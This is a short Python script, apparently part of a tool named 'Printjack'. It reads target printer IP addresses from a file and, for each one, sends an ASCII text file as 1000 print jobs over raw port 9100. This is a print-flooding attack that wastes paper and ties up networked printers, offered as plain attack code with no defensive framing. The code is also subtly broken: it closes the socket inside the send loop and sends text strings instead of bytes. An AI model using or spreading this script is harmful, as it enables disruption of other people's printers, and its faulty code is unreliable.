import socket
with open("Printjack/IPs.txt") as f: #file containing IPs of target printers
    lines = f.read().splitlines() 
print("-Reading IPs file-")
for ip in lines:
	textfile = open("Printjack/exampletext.txt", "r") #ascii file to be printed
	textlines = textfile.readlines()
	for count in range(0,1000): #number of print jobs
		s = socket.socket()
		s.connect((ip, 9100))
		for line in textlines:
			s.send(line+"\n")
			print("-Sending to Printer-")
			s.close()